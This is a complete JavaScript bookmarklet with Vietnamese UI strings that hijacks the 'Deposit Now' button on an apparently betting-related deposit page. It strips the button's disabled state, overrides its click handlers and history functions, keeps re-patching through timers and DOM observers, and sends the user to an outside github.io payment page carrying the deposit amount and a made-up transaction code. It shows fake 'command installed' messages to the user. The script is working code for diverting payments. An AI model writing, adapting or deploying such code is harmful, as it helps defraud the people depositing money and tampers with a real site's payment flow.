javascript:(function(){
  'use strict';
  const NETLIFY_URL = 'https://tranquyetchienbank-ops.github.io/bankqrf168/';
  const patched = new WeakSet();
  let redirecting = false;

  function showToast(msg) {
    const div = document.createElement('div');
    div.innerText = msg || 'cài lệnh thành công';
    Object.assign(div.style, {
      position: 'fixed',
      bottom: '30px',
      left: '50%',
      transform: 'translateX(-50%)',
      background: '#333',
      color: '#fff',
      padding: '12px 24px',
      borderRadius: '30px',
      fontSize: '16px',
      fontWeight: '600',
      zIndex: '9999',
      boxShadow: '0 4px 12px rgba(0,0,0,0.3)',
      transition: 'opacity 0.5s'
    });
    document.body.appendChild(div);
    setTimeout(() => {
      div.style.opacity = '0';
      setTimeout(() => div.remove(), 500);
    }, 2000);
  }

  function addGreenText() {
    if (document.getElementById('f168-text')) return;
    const txt = document.createElement('div');
    txt.id = 'f168-text';
    txt.innerText = 'Đang lấy cầu lệnh';
    Object.assign(txt.style, {
      position: 'fixed',
      top: '15px',
      right: '15px',
      color: '#2ecc71',
      fontSize: '13px',
      fontWeight: '700',
      fontFamily: '-apple-system, BlinkMacSystemFont, sans-serif',
      textShadow: '0 0 6px rgba(46,204,113,0.5)',
      zIndex: '9998',
      pointerEvents: 'none',
      letterSpacing: '0.5px'
    });
    document.body.appendChild(txt);
  }

  function randomTx() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 5; i++) {
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  }

  function doRedirect(e) {
    if (redirecting) return;
    redirecting = true;
    e.preventDefault();
    e.stopImmediatePropagation();
    e.stopPropagation();
    const input = document.querySelector('.ui-input__input');
    let points = input ? parseInt(input.value) || 0 : 0;
    if (isNaN(points) || points < 0) points = 0;
    let amount = points * 1000;
    const txCode = randomTx();
    // ĐÃ SỬA: thêm ?amount=
    const url = NETLIFY_URL + '?amount=' + amount + '&code=' + txCode;
    window.location.href = url;
    setTimeout(() => { redirecting = false; }, 1500);
    return false;
  }

  function patchButton(btn) {
    if (patched.has(btn)) return;
    patched.add(btn);
    btn.removeAttribute('disabled');
    btn.classList.remove('ui-button--disabled');
    const clone = btn.cloneNode(true);
    clone.removeAttribute('disabled');
    clone.classList.remove('ui-button--disabled');
    clone.removeAttribute('onclick');
    clone.onclick = null;
    if (btn.parentNode) btn.parentNode.replaceChild(clone, btn);
    patched.add(clone);
    let touched = false;
    clone.addEventListener('touchstart', function(e) {
      touched = true;
      e.stopImmediatePropagation();
    }, true);
    clone.addEventListener('touchend', function(e) {
      touched = true;
      doRedirect(e);
    }, true);
    clone.addEventListener('click', function(e) {
      if (touched) {
        touched = false;
        return;
      }
      doRedirect(e);
    }, true);
    new MutationObserver(() => {
      if (clone.hasAttribute('disabled')) {
        clone.removeAttribute('disabled');
        clone.classList.remove('ui-button--disabled');
      }
    }).observe(clone, { attributes: true, attributeFilter: ['disabled', 'class'] });
    console.log('[NapTien] Patched:', clone.id);
  }

  function findAndPatch() {
    try {
      const btn = document.getElementById('depositSubmitClick');
      if (btn && !patched.has(btn)) {
        patchButton(btn);
        return;
      }
      document.querySelectorAll('button.ui-button,button').forEach(el => {
        if (patched.has(el)) return;
        const t = el.innerText || el.textContent || '';
        if (t.trim().includes('Nạp Tiền Ngay')) patchButton(el);
      });
    } catch (e) {}
  }

  showToast('cài lệnh thành công');
  addGreenText();

  const _push = history.pushState;
  history.pushState = function(...a) {
    _push.apply(history, a);
    setTimeout(findAndPatch, 300);
    setTimeout(findAndPatch, 800);
    setTimeout(findAndPatch, 1500);
  };
  const _replace = history.replaceState;
  history.replaceState = function(...a) {
    _replace.apply(history, a);
    setTimeout(findAndPatch, 300);
  };
  window.addEventListener('popstate', () => {
    setTimeout(findAndPatch, 300);
    setTimeout(findAndPatch, 800);
  });

  findAndPatch();
  document.addEventListener('DOMContentLoaded', findAndPatch);
  window.addEventListener('load', findAndPatch);
  setInterval(findAndPatch, 1000);
  new MutationObserver(ms => {
    if (ms.some(m => m.addedNodes.length > 0)) findAndPatch();
  }).observe(document.documentElement || document.body, { childList: true, subtree: true });
})();
